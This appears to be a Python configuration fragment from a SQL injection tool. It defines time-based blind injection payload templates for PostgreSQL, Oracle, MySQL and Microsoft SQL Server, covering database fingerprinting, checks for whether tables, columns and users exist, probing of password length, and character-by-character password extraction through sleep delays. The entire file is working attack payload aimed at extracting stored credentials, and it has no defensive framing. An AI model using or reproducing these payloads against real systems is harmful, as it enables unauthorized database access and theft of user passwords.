
#-----------------PAYLOADS POR DBMS---------------------                             

DB_PROFILES = {

    # ══════════════════════ POSTGRESQL ═════════════════════════════
    # '; SELECT CASE WHEN (cond) THEN pg_sleep(N) ELSE pg_sleep(0) END--
    # '; SELECT pg_sleep(N)--
    "postgresql": {
        "name": "PostgreSQL",
        "comment": "--",

        "fingerprint": "'; SELECT pg_sleep({sleep})--",

        "table_exists": (
            "'; SELECT CASE WHEN "
            "(SELECT 'x' FROM {table} LIMIT 1)='x' "
            "THEN pg_sleep({sleep}) ELSE pg_sleep(0) END--"
        ),

        "column_exists": (
            "'; SELECT CASE WHEN "
            "(SELECT COUNT({column}) FROM {table} LIMIT 1)>=0 "
            "THEN pg_sleep({sleep}) ELSE pg_sleep(0) END--"
        ),

        "user_exists": (
            "'; SELECT CASE WHEN "
            "(SELECT '{user}' FROM {table} "
            "WHERE {col_user}='{user}' LIMIT 1)='{user}' "
            "THEN pg_sleep({sleep}) ELSE pg_sleep(0) END--"
        ),

        "password_length": (
            "'; SELECT CASE WHEN "
            "LENGTH({col_pass})>{length} "
            "THEN pg_sleep({sleep}) ELSE pg_sleep(0) END "
            "FROM {table} WHERE {col_user}='{user}' LIMIT 1--"
        ),

        "extract_char": (
            "'; SELECT CASE WHEN "
            "ASCII(SUBSTRING({col_pass},{pos},1))>{mid} "
            "THEN pg_sleep({sleep}) ELSE pg_sleep(0) END "
            "FROM {table} WHERE {col_user}='{user}' LIMIT 1--"
        ),
    },

    # ════════════════════════ ORACLE ═══════════════════════════════
    # AND 1337=(CASE WHEN (cond) THEN DBMS_PIPE.RECEIVE_MESSAGE('x',N) ELSE 1337 END)
    "oracle": {
        "name": "Oracle",
        "comment": "--",

        "fingerprint": (
            "' AND 1337=(CASE WHEN (1=1) "
            "THEN DBMS_PIPE.RECEIVE_MESSAGE('x',{sleep}) "
            "ELSE 1337 END)--"
        ),

        "table_exists": (
            "' AND 1337=(CASE WHEN "
            "(SELECT 'x' FROM {table} WHERE ROWNUM=1)='x' "
            "THEN DBMS_PIPE.RECEIVE_MESSAGE('x',{sleep}) "
            "ELSE 1337 END)--"
        ),

        "column_exists": (
            "' AND 1337=(CASE WHEN "
            "(SELECT COUNT({column}) FROM {table} WHERE ROWNUM=1)>=0 "
            "THEN DBMS_PIPE.RECEIVE_MESSAGE('x',{sleep}) "
            "ELSE 1337 END)--"
        ),

        "user_exists": (
            "' AND 1337=(CASE WHEN "
            "(SELECT '{user}' FROM {table} "
            "WHERE {col_user}='{user}' AND ROWNUM=1)='{user}' "
            "THEN DBMS_PIPE.RECEIVE_MESSAGE('x',{sleep}) "
            "ELSE 1337 END)--"
        ),

        "password_length": (
            "' AND 1337=(CASE WHEN "
            "(SELECT LENGTH({col_pass}) FROM {table} "
            "WHERE {col_user}='{user}')>{length} "
            "THEN DBMS_PIPE.RECEIVE_MESSAGE('x',{sleep}) "
            "ELSE 1337 END)--"
        ),

        "extract_char": (
            "' AND 1337=(CASE WHEN "
            "(SELECT ASCII(SUBSTR({col_pass},{pos},1)) "
            "FROM {table} WHERE {col_user}='{user}')>{mid} "
            "THEN DBMS_PIPE.RECEIVE_MESSAGE('x',{sleep}) "
            "ELSE 1337 END)--"
        ),
    },

    # ════════════════════════ MYSQL ════════════════════════════════
    # XOR(IF(NOW()=SYSDATE(),SLEEP(N),0))XOR   (fingerprint)
    # AND IF(cond, SLEEP(N), 0)=0 #            (conditional)
    "mysql": {
        "name": "MySQL",
        "comment": "#",

        "fingerprint": "' XOR(IF(NOW()=SYSDATE(),SLEEP({sleep}),0))XOR '",

        "table_exists": (
            "' AND IF("
            "(SELECT 'x' FROM {table} LIMIT 1)='x',"
            "SLEEP({sleep}),0)=0{comment}"
        ),

        "column_exists": (
            "' AND IF("
            "(SELECT COUNT({column}) FROM {table} LIMIT 1)>=0,"
            "SLEEP({sleep}),0)=0{comment}"
        ),

        "user_exists": (
            "' AND IF("
            "(SELECT '{user}' FROM {table} "
            "WHERE {col_user}='{user}' LIMIT 1)='{user}',"
            "SLEEP({sleep}),0)=0{comment}"
        ),

        "password_length": (
            "' AND IF("
            "(SELECT LENGTH({col_pass}) FROM {table} "
            "WHERE {col_user}='{user}')>{length},"
            "SLEEP({sleep}),0)=0{comment}"
        ),

        "extract_char": (
            "' AND IF("
            "ASCII(SUBSTRING((SELECT {col_pass} FROM {table} "
            "WHERE {col_user}='{user}'),{pos},1))>{mid},"
            "SLEEP({sleep}),0)=0{comment}"
        ),
    },

    # ════════════════════════ MSSQL ════════════════════════════════
    # '; IF (cond) WAITFOR DELAY '0:0:N' ELSE WAITFOR DELAY '0:0:0'--
    "mssql": {
        "name": "Microsoft SQL Server",
        "comment": "--",

        "fingerprint": "'; WAITFOR DELAY '0:0:{sleep}'--",

        "table_exists": (
            "'; IF (SELECT TOP 1 'x' FROM {table})='x' "
            "WAITFOR DELAY '0:0:{sleep}' "
            "ELSE WAITFOR DELAY '0:0:0'--"
        ),

        "column_exists": (
            "'; IF (SELECT TOP 1 COUNT({column}) FROM {table})>=0 "
            "WAITFOR DELAY '0:0:{sleep}' "
            "ELSE WAITFOR DELAY '0:0:0'--"
        ),

        "user_exists": (
            "'; IF (SELECT TOP 1 '{user}' FROM {table} "
            "WHERE {col_user}='{user}')='{user}' "
            "WAITFOR DELAY '0:0:{sleep}' "
            "ELSE WAITFOR DELAY '0:0:0'--"
        ),

        "password_length": (
            "'; IF (SELECT LEN({col_pass}) FROM {table} "
            "WHERE {col_user}='{user}')>{length} "
            "WAITFOR DELAY '0:0:{sleep}' "
            "ELSE WAITFOR DELAY '0:0:0'--"
        ),

        "extract_char": (
            "'; IF (SELECT ASCII(SUBSTRING({col_pass},{pos},1)) "
            "FROM {table} WHERE {col_user}='{user}')>{mid} "
            "WAITFOR DELAY '0:0:{sleep}' "
            "ELSE WAITFOR DELAY '0:0:0'--"
        ),
    },
}
